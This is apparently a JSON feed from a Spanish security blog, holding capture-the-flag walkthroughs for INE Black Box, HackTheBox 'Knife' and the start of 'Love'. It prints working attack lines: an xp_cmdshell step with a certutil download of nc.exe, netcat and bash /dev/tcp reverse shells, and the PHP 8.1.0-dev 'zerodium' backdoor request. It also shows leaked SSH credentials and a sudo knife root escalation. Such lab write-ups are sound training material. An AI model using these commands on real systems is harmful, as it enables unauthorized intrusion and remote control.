class=\"o\">(</span>LANGUAGE<span class=\"o\">)</span>: Old Value: , New Value: us_english<span class=\"o\">[</span><span class=\"k\">*</span><span class=\"o\">]</span> ENVCHANGE<span class=\"o\">(</span>PACKETSIZE<span class=\"o\">)</span>: Old Value: 4096, New Value: 16192<span class=\"o\">[</span><span class=\"k\">*</span><span class=\"o\">]</span> INFO<span class=\"o\">(</span>WIN10<span class=\"se\">\\F</span>OOSQL<span class=\"o\">)</span>: Line 1: Changed database context to <span class=\"s1\">'master'</span><span class=\"nb\">.</span><span class=\"o\">[</span><span class=\"k\">*</span><span class=\"o\">]</span> INFO<span class=\"o\">(</span>WIN10<span class=\"se\">\\F</span>OOSQL<span class=\"o\">)</span>: Line 1: Changed language setting to us_english.<span class=\"o\">[</span><span class=\"k\">*</span><span class=\"o\">]</span> ACK: Result: 1 - Microsoft SQL Server <span class=\"o\">(</span>120 7208<span class=\"o\">)</span><span class=\"o\">[!]</span> Press <span class=\"nb\">help </span><span class=\"k\">for </span>extra shell commandsSQL&gt;</code></pre></div></div><p>Y así llegamos al servidor SQL, del cual podemos sacar una shell con xp_cmdshell. Si escribimos “help” nos muestra una lista de comandos:</p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>SQL&gt; <span class=\"nb\">help     </span>lcd <span class=\"o\">{</span>path<span class=\"o\">}</span>                 - changes the current <span class=\"nb\">local </span>directory to <span class=\"o\">{</span>path<span class=\"o\">}</span>     <span class=\"nb\">exit</span>                       - terminates the server process <span class=\"o\">(</span>and this session<span class=\"o\">)</span>     enable_xp_cmdshell         - you know what it means     disable_xp_cmdshell        - you know what it means     xp_cmdshell <span class=\"o\">{</span>cmd<span class=\"o\">}</span>          - executes cmd using xp_cmdshell     sp_start_job <span class=\"o\">{</span>cmd<span class=\"o\">}</span>         - executes cmd using the sql server agent <span class=\"o\">(</span>blind<span class=\"o\">)</span>     <span class=\"o\">!</span> <span class=\"o\">{</span>cmd<span class=\"o\">}</span>                    - executes a <span class=\"nb\">local </span>shell cmd</code></pre></div></div><p>Habilitamos la consola con enable_xp_cmdshell y ejecutamos comandos con xp_cmdshell. Ya que no tenemos formas de enviarnos una reverse shell sin ningún programa, descargué un binario compilado de netcat(en Kali/Parrot hay uno) y mediante un servidor HTTP con Python y certutil.exe, me lo pude descargar y enviarme un cmd.exe a mi equipo.</p><p>Primero, creamos un servidor con Python en el puerto 80(si no sois root necesitaréis sudo) usando la librería http de esta forma: <code class=\"language-plaintext highlighter-rouge\">python3 -m http.server 80</code> y usando certutil.exe lo descargamos en la máquinacon el comando <code class=\"language-plaintext highlighter-rouge\">certutil.exe -urlcache -f http://tuip/nc.exe nc.exe</code></p><p>Tras haberlo descargado, solo habría que ejecutarlo y con el parámetro -e enviar un cmd.exe a tu ip y el puerto en el que estés escuchando para conseguir acceso a esta máquina.</p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>rlwrap ncat <span class=\"nt\">-nlvp</span> 443Ncat: Version 7.92 <span class=\"o\">(</span> https://nmap.org/ncat <span class=\"o\">)</span>Ncat: Listening on :::443Ncat: Listening on 0.0.0.0:443Ncat: Connection from 172.16.64.199.Ncat: Connection from 172.16.64.199:49678.Microsoft Windows <span class=\"o\">[</span>Version 10.0.10586]<span class=\"o\">(</span>c<span class=\"o\">)</span> 2015 Microsoft Corporation. All rights reserved.<span class=\"nb\">whoami</span>nt authority<span class=\"se\">\\s</span>ystem</code></pre></div></div><h1 id=\"maquina3\">Credenciales para la 172.16.64.182</h1><p>Y así, estamos casi metidos hasta la cocina, ya que nos faltaría una máquina por comprometer, la 172.16.64.182, que solo tiene el puerto 22 abierto.</p><p>Si miramos en el directorio Users encontramos varios usuarios, la flag está en C:\\Users\\AdminELS\\Desktop, junto con lo que supuestamente es una clave pública de SSH:</p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nb\">type </span>id_rsa.pub&lt;texto de relleno&gt;jUXBbjB0c7SmXzondjmMPcamjjTTB7kcyIQ/3BQfBya1qhjXeimpmiNX1nnQ<span class=\"o\">==</span> rsa-key-20190313###ssh://developer:dF3334slKw@172.16.64.182:22################&lt;relleno&gt;</code></pre></div></div><p>Pero si la miramos de cerca vemos unas credenciales para la máquina que falta por comprometer, que serían las credenciales developer:dF3334slKw. Si entramos por SSH a la 172.16.64.182, veremos la última flag y habremos comprometido todas las máquinas de esta Black Box.</p><p>Si te ha gustado puedes ir a mi <a href=\"https://github.com/binlaab\">github</a> y darme una estrellita :)</p>",
            "url": "https://binlaab.github.io/2021/09/08/ine-black-box-1",
            
            
            
            
            
            "date_published": "2021-09-08T00:00:00+00:00",
            "date_modified": "2021-09-08T00:00:00+00:00",
            
                "author":  {
                "name": "p0wex",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://binlaab.github.io/2021/08/28/knife",
            "title": Knife,
            "summary": null,
            "content_text": "Knife es una máquina linux de nivel fácil, creada por MrKN16H7, en la que vamos a explotar un bug de PHP para conseguir una RCEy ejecutar un binario como root para convertirnos en él.Según los seres vivos que hay por HackTheBox, la máquina es así:Muy CTF(y es así)1 - Reconocimiento inicial2 - Reconocimiento profundo3 - Explotación4 - Escalada de privilegios y flag[Reconocimiento inicial]# Nmap 7.92 scan initiated Fri Aug 27 20:20:39 2021 as: nmap -p- --open --min-rate 3000 -sS -Pn -n -v 10.10.10.242 -oG ports -oN ports.nmapNmap scan report for 10.10.10.242Host is up (0.30s latency).Not shown: 51068 closed tcp ports (reset), 14465 filtered tcp ports (no-response)Some closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT   STATE SERVICE22/tcp open  ssh80/tcp open  httpRead data files from: /usr/bin/../share/nmap# Nmap done at Fri Aug 27 20:21:14 2021 -- 1 IP address (1 host up) scanned in 34.80 secondsPequeña explicación de los parámetros de nmap  -p-: Escanea todos los puertos.  –open: Solo muestra los que están abiertos.  –min-rate: Envía un mínimo de paquetes por segundo para que vaya más rápido, con un número muy alto, como 10000, puede dar falsos positivos o negativos.  -sS: TCP SYN Port Scan, agiliza un poco el escaneo ya que no espera a que se complete el Three-Way Handshake.  -Pn: Deshabilita el descubrimiento de host mediante pings a la máquina para comprobar si está activa.  -n: Deshabilita la resolución DNS  -v: Muestra los puertos a medida que los descubre  -oG: Guarda el escaneo de nmap en diferentes formatos, -oG lo guarda en formato grepeable, para luego usar la función extractPorts de s4vitar  -oN: Guarda el escaneo como aparece por consola.Los puertos abiertos son el 22, para obtener una shell segura(SSH), y 80, que hostea un servidor HTTP.[Reconocimiento profundo]Ahora que tenemos los puertos abiertos de la máquina, vamos a enumerarlos(de forma básica) y a detectar la versión y servicio que corren.❯ nmap -sCV -p22,80 10.10.10.242 -oN targetedStarting Nmap 7.92 ( https://nmap.org ) at 2021-08-28 15:47 CESTNmap scan report for 10.10.10.242Host is up (0.049s latency).PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))|_http-title:  Emergent Medical Idea|_http-server-header: Apache/2.4.41 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 8.69 secondsExplotaciónSi vamos a la página web, lo primero que encontramos es esto, un servidor Apache con PHP 8.1:Si buscamos exploits para la versión de Apache que corre no encontramos nada, en cambio, si buscamos exploits para la versión de PHP que corre, encontramos uno muy interesante que nos permite ejecutar código mediante la cabecera User-Agentt: zerodiumsystem(\"[comando]\"); en la petición.  An early release of PHP, the PHP 8.1.0-dev version was released with a backdoor on March 28th 2021, but the backdoor was quickly discovered and removed. If this version of PHP runs on a server, an attacker can execute arbitrary code by sending the User-Agentt header.https://flast101.github.io/php-8.1.0-dev-backdoor-rce/Esto se puede hacer de tres formas: con un script automatizado para ello, con cURL mediante el parámetro -H o interceptando la petición con BurpSuite y añadiendo esta cabecera.Explotación con cURLcURL tiene el parámetro -H, mediante el cual le puedes asignar más cabeceras a tu petición si son necesarias, entonces si le añadimos la cabecera User-Agentt: zerodiumsystem(\"[comando]\"); podríamos ejecutar comandos a nivel de sistema en la máquina. El comando sería así: ❯ curl -s -H 'User-Agentt: zerodiumsystem(\"whoami\");' 10.10.10.242 | grep -i doctype -B 1 | grep -v -i doctypeLe he añadido grep para ver únicamente el resultado del comando, que se encuentra al principio del código de la página web.Explotación con BurpSuiteCon BurpSuite hay que interceptar la petición hacia la página web, y modificarla con la misma cabecera de antes. Es recomendable pasar la petición al Repeater con Ctrl + R para poder modificarla como quieras y sin tener que recargar la página cada vez que vayas a ejecutar el comando.Conseguir una Reverse ShellAhora solo habría que ejecutar la Reverse Shell de siempre, si no la sabes es: bash -c 'bash -i &gt;&amp; /dev/tcp/tuip/puertoEnElQueTienesNC 0&gt;&amp;1'Y la petición quedaría así: GET / HTTP/1.1Host: 10.10.10.242User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:92.0) Gecko/20100101 Firefox/92.0User-Agentt: zerodiumsystem(\"bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.49/443 0&gt;&amp;1'\");Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1Cache-Control: max-age=0Yyyyyy estamos dentrooooooo :DFlag y PrivescAhora mismo, si por cualquier cosa hiciera Ctrl+C tendría que volver a enviarme la shell, cosa que nadie quiere, así que tendremos que hacer tratamiento de la TTYVale, ahora que tenemos una consola interactiva en el sistema, podríamos ir a ver la User Flag, ubicada en /home/james/user.txt:james@knife:~$ cat user.txt | head -c 15;echocf42b739b6d4f75Ahora que tenemos taambién la flag, habría que centrarse en la escalada de privilegios, si hacemos sudo -l para ver si podemos ejecutar algún comando o binario como otro usuario, obtenemos:james@knife:~$ sudo -lMatching Defaults entries for james on knife:    env_reset, mail_badpass,    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser james may run the following commands on knife:    (root) NOPASSWD: /usr/bin/knifeEntonces podemos ejecutar knife como root, si buscamos en gtfobins sobre este binario, vemos que es capaz de correr código Ruby, y que se puede usar para escalar privilegios.  Sudo  If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain &gt;privileged access.  sudo knife exec -E 'exec \"/bin/sh\"'Así que ejecutamos ese comando y…Yasta, somos root y podríamos irnos a /root a recoger nuestro premio por conseguir el root.Ha sido una máquina en la que no ha habido que enumerar mucho, lo cual la hace más rápida. Me ha gustado como hay que ganar acceso a la máquina y la historia detrás del bug de PHP. Si te ha gustado puedes darme una estrellita al blog :)Y recuerda, Metasploit siempre es la solución.",
            "content_html": "<p>Knife es una máquina linux de nivel fácil, creada por <a href=\"https://app.hackthebox.eu/users/98767\">MrKN16H7</a>, en la que vamos a explotar un bug de PHP para conseguir una RCEy ejecutar un binario como root para convertirnos en él.</p><p><img src=\"https://user-images.githubusercontent.com/71317374/131216908-df335eaa-0496-43e5-bc76-2d77ec7be9f9.png\" alt=\"imagen\" /></p><p>Según los seres vivos que hay por HackTheBox, la máquina es así:</p><p><img src=\"https://user-images.githubusercontent.com/71317374/131216886-9c9c8b8e-6fef-4467-914f-d108e367b3d5.png\" alt=\"imagen\" /></p><p>Muy CTF(y es así)</p><p>1 - <a href=\"#recon\">Reconocimiento inicial</a></p><p>2 - <a href=\"#deeprecon\">Reconocimiento profundo</a></p><p>3 - <a href=\"#exploit\">Explotación</a></p><p>4 - <a href=\"#privesc\">Escalada de privilegios y flag</a></p><h1 id=\"recon\">[Reconocimiento inicial]</h1><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># Nmap 7.92 scan initiated Fri Aug 27 20:20:39 2021 as: nmap -p- --open --min-rate 3000 -sS -Pn -n -v 10.10.10.242 -oG ports -oN ports.nmap</span>Nmap scan report <span class=\"k\">for </span>10.10.10.242Host is up <span class=\"o\">(</span>0.30s latency<span class=\"o\">)</span><span class=\"nb\">.</span>Not shown: 51068 closed tcp ports <span class=\"o\">(</span>reset<span class=\"o\">)</span>, 14465 filtered tcp ports <span class=\"o\">(</span>no-response<span class=\"o\">)</span>Some closed ports may be reported as filtered due to <span class=\"nt\">--defeat-rst-ratelimit</span>PORT   STATE SERVICE22/tcp open  ssh80/tcp open  httpRead data files from: /usr/bin/../share/nmap<span class=\"c\"># Nmap done at Fri Aug 27 20:21:14 2021 -- 1 IP address (1 host up) scanned in 34.80 seconds</span></code></pre></div></div><h2 id=\"pequeña-explicación-de-los-parámetros-de-nmap\">Pequeña explicación de los parámetros de nmap</h2><ul>  <li>-p-: Escanea todos los puertos.</li>  <li>–open: Solo muestra los que están abiertos.</li>  <li>–min-rate: Envía un mínimo de paquetes por segundo para que vaya más rápido, con un número muy alto, como 10000, puede dar falsos positivos o negativos.</li>  <li>-sS: TCP SYN Port Scan, agiliza un poco el escaneo ya que no espera a que se complete el <a href=\"https://networksigma.com/tcp-3-way-handshake/\">Three-Way Handshake</a>.</li>  <li>-Pn: Deshabilita el descubrimiento de host mediante pings a la máquina para comprobar si está activa.</li>  <li>-n: Deshabilita la resolución DNS</li>  <li>-v: Muestra los puertos a medida que los descubre</li>  <li>-oG: Guarda el escaneo de nmap en diferentes formatos, -oG lo guarda en formato grepeable, para luego usar la <a href=\"https://pastebin.com/tYpwpauW\">función extractPorts de s4vitar</a></li>  <li>-oN: Guarda el escaneo como aparece por consola.</li></ul><p>Los puertos abiertos son el 22, para obtener una shell segura(SSH), y 80, que hostea un servidor HTTP.</p><h1 id=\"deeprecon\">[Reconocimiento profundo]</h1><p>Ahora que tenemos los puertos abiertos de la máquina, vamos a enumerarlos(de forma básica) y a detectar la versión y servicio que corren.</p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>❯ nmap <span class=\"nt\">-sCV</span> <span class=\"nt\">-p22</span>,80 10.10.10.242 <span class=\"nt\">-oN</span> targetedStarting Nmap 7.92 <span class=\"o\">(</span> https://nmap.org <span class=\"o\">)</span> at 2021-08-28 15:47 CESTNmap scan report <span class=\"k\">for </span>10.10.10.242Host is up <span class=\"o\">(</span>0.049s latency<span class=\"o\">)</span><span class=\"nb\">.</span>PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 <span class=\"o\">(</span>Ubuntu Linux<span class=\"p\">;</span> protocol 2.0<span class=\"o\">)</span>| ssh-hostkey:|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 <span class=\"o\">(</span>RSA<span class=\"o\">)</span>|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee <span class=\"o\">(</span>ECDSA<span class=\"o\">)</span>|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 <span class=\"o\">(</span>ED25519<span class=\"o\">)</span>80/tcp open  http    Apache httpd 2.4.41 <span class=\"o\">((</span>Ubuntu<span class=\"o\">))</span>|_http-title:  Emergent Medical Idea|_http-server-header: Apache/2.4.41 <span class=\"o\">(</span>Ubuntu<span class=\"o\">)</span>Service Info: OS: Linux<span class=\"p\">;</span> CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class=\"nb\">.</span>Nmap <span class=\"k\">done</span>: 1 IP address <span class=\"o\">(</span>1 host up<span class=\"o\">)</span> scanned <span class=\"k\">in </span>8.69 seconds</code></pre></div></div><h1 id=\"exploit\">Explotación</h1><p>Si vamos a la página web, lo primero que encontramos es esto, un servidor Apache con PHP 8.1:</p><p><img src=\"https://user-images.githubusercontent.com/71317374/131220276-fec35a9e-4b46-4692-b37f-6d8bef6caf25.png\" alt=\"imagen\" /></p><p>Si buscamos exploits para la versión de Apache que corre no encontramos nada, en cambio, si buscamos exploits para la versión de PHP que corre, encontramos uno muy interesante que nos permite ejecutar código mediante la cabecera <code class=\"language-plaintext highlighter-rouge\">User-Agentt: zerodiumsystem(\"[comando]\");</code> en la petición.</p><blockquote>  <p>An early release of PHP, the PHP 8.1.0-dev version was released with a backdoor on March 28th 2021, but the backdoor was quickly discovered and removed. If this version of PHP runs on a server, an attacker can execute arbitrary code by sending the User-Agentt header.</p></blockquote><p><a href=\"https://flast101.github.io/php-8.1.0-dev-backdoor-rce/\">https://flast101.github.io/php-8.1.0-dev-backdoor-rce/</a></p><p>Esto se puede hacer de tres formas: con un script automatizado para ello, con cURL mediante el parámetro -H o interceptando la petición con BurpSuite y añadiendo esta cabecera.</p><h2 id=\"explotación-con-curl\">Explotación con cURL</h2><p>cURL tiene el parámetro -H, mediante el cual le puedes asignar más cabeceras a tu petición si son necesarias, entonces si le añadimos la cabecera <code class=\"language-plaintext highlighter-rouge\">User-Agentt: zerodiumsystem(\"[comando]\");</code> podríamos ejecutar comandos a nivel de sistema en la máquina. El comando sería así:</p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code> ❯ curl <span class=\"nt\">-s</span> <span class=\"nt\">-H</span> <span class=\"s1\">'User-Agentt: zerodiumsystem(\"whoami\");'</span> 10.10.10.242 | <span class=\"nb\">grep</span> <span class=\"nt\">-i</span> doctype <span class=\"nt\">-B</span> 1 | <span class=\"nb\">grep</span> <span class=\"nt\">-v</span> <span class=\"nt\">-i</span> doctype</code></pre></div></div><p>Le he añadido grep para ver únicamente el resultado del comando, que se encuentra al principio del código de la página web.</p><h2 id=\"explotación-con-burpsuite\">Explotación con BurpSuite</h2><p>Con BurpSuite hay que interceptar la petición hacia la página web, y modificarla con la misma cabecera de antes. Es recomendable pasar la petición al Repeater con Ctrl + R para poder modificarla como quieras y sin tener que recargar la página cada vez que vayas a ejecutar el comando.</p><h2 id=\"conseguir-una-reverse-shell\">Conseguir una Reverse Shell</h2><p>Ahora solo habría que ejecutar la Reverse Shell de siempre, si no la sabes es:</p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code> bash <span class=\"nt\">-c</span> <span class=\"s1\">'bash -i &gt;&amp; /dev/tcp/tuip/puertoEnElQueTienesNC 0&gt;&amp;1'</span></code></pre></div></div><p>Y la petición quedaría así:</p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code> GET / HTTP/1.1Host: 10.10.10.242User-Agent: Mozilla/5.0 <span class=\"o\">(</span>X11<span class=\"p\">;</span> Linux x86_64<span class=\"p\">;</span> rv:92.0<span class=\"o\">)</span> Gecko/20100101 Firefox/92.0User-Agentt: zerodiumsystem<span class=\"o\">(</span><span class=\"s2\">\"bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.49/443 0&gt;&amp;1'\"</span><span class=\"o\">)</span><span class=\"p\">;</span>Accept: text/html,application/xhtml+xml,application/xml<span class=\"p\">;</span><span class=\"nv\">q</span><span class=\"o\">=</span>0.9,image/avif,image/webp,<span class=\"k\">*</span>/<span class=\"k\">*</span><span class=\"p\">;</span><span class=\"nv\">q</span><span class=\"o\">=</span>0.8Accept-Language: en-US,en<span class=\"p\">;</span><span class=\"nv\">q</span><span class=\"o\">=</span>0.5Accept-Encoding: <span class=\"nb\">gzip</span>, deflateConnection: closeUpgrade-Insecure-Requests: 1Cache-Control: max-age<span class=\"o\">=</span>0</code></pre></div></div><p>Yyyyyy estamos dentrooooooo :D</p><p><img src=\"https://user-images.githubusercontent.com/71317374/131221770-5691e50a-7486-48ef-819f-9549fd457f4e.png\" alt=\"imagen\" /></p><h1 id=\"privesc\">Flag y Privesc</h1><p>Ahora mismo, si por cualquier cosa hiciera Ctrl+C tendría que volver a enviarme la shell, cosa que nadie quiere, así que tendremos que hacer <a href=\"https://www.thehackersnow.com/tratamiento-de-una-tty/\">tratamiento de la TTY</a></p><p>Vale, ahora que tenemos una consola interactiva en el sistema, podríamos ir a ver la User Flag, ubicada en /home/james/user.txt:</p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>james@knife:~<span class=\"nv\">$ </span><span class=\"nb\">cat </span>user.txt | <span class=\"nb\">head</span> <span class=\"nt\">-c</span> 15<span class=\"p\">;</span><span class=\"nb\">echo</span>cf42b739b6d4f75</code></pre></div></div><p>Ahora que tenemos taambién la flag, habría que centrarse en la escalada de privilegios, si hacemos <code class=\"language-plaintext highlighter-rouge\">sudo -l</code> para ver si podemos ejecutar algún comando o binario como otro usuario, obtenemos:</p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>james@knife:~<span class=\"nv\">$ </span><span class=\"nb\">sudo</span> <span class=\"nt\">-l</span>Matching Defaults entries <span class=\"k\">for </span>james on knife:    env_reset, mail_badpass,    <span class=\"nv\">secure_path</span><span class=\"o\">=</span>/usr/local/sbin<span class=\"se\">\\:</span>/usr/local/bin<span class=\"se\">\\:</span>/usr/sbin<span class=\"se\">\\:</span>/usr/bin<span class=\"se\">\\:</span>/sbin<span class=\"se\">\\:</span>/bin<span class=\"se\">\\:</span>/snap/binUser james may run the following commands on knife:    <span class=\"o\">(</span>root<span class=\"o\">)</span> NOPASSWD: /usr/bin/knife</code></pre></div></div><p>Entonces podemos ejecutar <strong>knife</strong> como root, si buscamos en <a href=\"gtfobins.github.io\">gtfobins</a> sobre este binario, vemos que es capaz de correr código Ruby, y que se puede usar para escalar privilegios.</p><blockquote>  <p>Sudo</p>  <p>If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain &gt;privileged access.</p>  <p><code class=\"language-plaintext highlighter-rouge\">sudo knife exec -E 'exec \"/bin/sh\"'</code></p></blockquote><p>Así que ejecutamos ese comando y…</p><p><img src=\"https://user-images.githubusercontent.com/71317374/131222071-b59c07d1-a759-4382-9576-569e603afcfe.png\" alt=\"imagen\" /></p><p>Yasta, somos root y podríamos irnos a /root a recoger nuestro premio por conseguir el root.</p><p>Ha sido una máquina en la que no ha habido que enumerar mucho, lo cual la hace más rápida. Me ha gustado como hay que ganar acceso a la máquina y la historia detrás del bug de PHP. Si te ha gustado puedes darme una estrellita al blog :)</p><p>Y recuerda, Metasploit siempre es la solución.</p>",
            "url": "https://binlaab.github.io/2021/08/28/knife",
            
            
            
            
            
            "date_published": "2021-08-28T00:00:00+00:00",
            "date_modified": "2021-08-28T00:00:00+00:00",
            
                "author":  {
                "name": "p0wex",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://binlaab.github.io/2021/08/07/love",
            "title": Love,
            "summary": null,
            "content_text": "Love es una máquina Windows de nivel fácil en la que tendremos que explotar un SSRF para conseguir credenciales para iniciar sesión como administrador, subir una shell en PHPe instalar un binario para ser NT AUTHORITY\\SYSTEM.Como siempre, empezamos escaneando puertos para saber por donde ir para atacar:# Nmap 7.91 scan initiated Fri Aug  6 11:59:13 2021 as: nmap -p- --open -sS --min-rate 5000 -n -v -Pn -oG ports -oN ports.nmap 10.10.10.239Nmap scan report for 10.10.10.239Host is up (0.16s latency).Not shown: 54285 closed ports, 11231 filtered portsSome closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT      STATE SERVICE80/tcp    open  http135/tcp   open  msrpc139/tcp   open  netbios-ssn443/tcp   open  https445/tcp   open  microsoft-ds3306/tcp  open  mysql5000/tcp  open  upnp5040/tcp  open  unknown5985/tcp  open  wsman5986/tcp  open  wsmans7680/tcp  open  pando-pub47001/tcp open  winrm49664/tcp open  unknown49665/tcp open  unknown49666/tcp open  unknown49667/tcp open  unknown49668/tcp open  unknown49669/tcp open  unknown49670/tcp open  unknownRead data files from: /usr/bin/../share/nmap# Nmap done at Fri Aug  6 12:00:05 2021 -- 1 IP address (1 host up) scanned in 52.20 seconds            Puerto            Servicio                80        HTTP - aloja una página web                  135        msrpc - nos podríamos conectar con rpcclient para enumerar usuarios                443        HTTPS - como HTTP pero más seguro                445        SMB - para acceder a recursos compartidos del sistema con smbclient                3306        MySQL - una base de datos en la que pueden haber contraseñas                 47001        WinRM - sirve para administrar el sistema de forma remota, nos podríamos conectar con evil-winRM con credenciales válidas    He decidido no poner el resto de puertos ya que no vamos a hacer nada con ellos ni he encontrado una explicación que me guste, y no me gusta extenderme de más.Tras ver qué puertos están abiertos hacemos un escaneo exhaustivo de estos con -sC y -sV para ver la versión y servicio que corren y usar unos scripts básicos de enumeración:# Nmap 7.91 scan initiated Fri Aug  6 12:01:14 2021 as: nmap -sC -sV -p80,135,139,443,445,3306,5000,5040,5985,5986,7680,47001,49664,49665,49666,49667,49668,49669,49670 -oN targeted 10.10.10.239Nmap scan report for 10.10.10.239Host is up (0.36s latency).PORT      STATE SERVICE      VERSION80/tcp    open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)135/tcp   open  msrpc        Microsoft Windows RPC139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn443/tcp   open  ssl/http     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27|_http-title: 403 Forbidden| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in| Not valid before: 2021-01-18T14:00:16|_Not valid after:  2022-01-18T14:00:16|_ssl-date: TLS randomness does not represent time| tls-alpn: |_  http/1.1445/tcp   open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)3306/tcp  open  mysql?| fingerprint-strings: |   LDAPBindReq, LPDString, TLSSessionReq, afp: |_    Host '10.10.14.137' is not allowed to connect to this MariaDB server5000/tcp  open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27|_http-title: 403 Forbidden5040/tcp  open  unknown5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found5986/tcp  open  ssl/http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found| ssl-cert: Subject: commonName=LOVE| Subject Alternative Name: DNS:LOVE, DNS:Love| Not valid before: 2021-04-11T14:39:19|_Not valid after:  2024-04-10T14:39:19|_ssl-date: 2021-08-06T16:25:59+00:00; +21m35s from scanner time.| tls-alpn: |_  http/1.17680/tcp  open  pando-pub?47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found49664/tcp open  msrpc        Microsoft Windows RPC49665/tcp open  msrpc        Microsoft Windows RPC49666/tcp open  msrpc        Microsoft Windows RPC49667/tcp open  msrpc        Microsoft Windows RPC49668/tcp open  msrpc        Microsoft Windows RPC49669/tcp open  msrpc        Microsoft Windows RPC49670/tcp open  msrpc        Microsoft Windows RPC1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port3306-TCP:V=7.91%I=7%D=8/6%Time=610D5CDC%P=x86_64-pc-linux-gnu%r(TLSSF:SessionReq,4B,\"G\\0\\0\\x01\\xffj\\x04Host\\x20'10\\.10\\.14\\.137'\\x20is\\x20notSF:\\x20allowed\\x20to\\x20connect\\x20to\\x20this\\x20MariaDB\\x20server\")%r(LPDSF:String,4B,\"G\\0\\0\\x01\\xffj\\x04Host\\x20'10\\.10\\.14\\.137'\\x20is\\x20not\\x20SF:allowed\\x20to\\x20connect\\x20to\\x20this\\x20MariaDB\\x20server\")%r(LDAPBinSF:dReq,4B,\"G\\0\\0\\x01\\xffj\\x04Host\\x20'10\\.10\\.14\\.137'\\x20is\\x20not\\x20alSF:lowed\\x20to\\x20connect\\x20to\\x20this\\x20MariaDB\\x20server\")%r(afp,4B,\"GSF:\\0\\0\\x01\\xffj\\x04Host\\x20'10\\.10\\.14\\.137'\\x20is\\x20not\\x20allowed\\x20tSF:o\\x20connect\\x20to\\x20this\\x20MariaDB\\x20server\");Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: mean: 2h06m36s, deviation: 3h30m03s, median: 21m34s| smb-os-discovery: |   OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)|   OS CPE: cpe:/o:microsoft:windows_10::-|   Computer name: Love|   NetBIOS computer name: LOVE\\x00|   Workgroup: WORKGROUP\\x00|_  System time: 2021-08-06T09:25:41-07:00| smb-security-mode: |   account_used: &lt;blank&gt;|   authentication_level: user|   challenge_response: supported|_  message_signing: disabled (dangerous, but default)| smb2-security-mode: |   2.02: |_    Message signing enabled but not required| smb2-time: |   date: 2021-08-06T16:25:48|_  start_date: N/AService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Fri Aug  6 12:04:27 2021 -- 1 IP address (1 host up) scanned in 192.89 secondsHaciendo un escaneo de la versión y el servicio que corre cada uno de estos puertos nos encontramos un 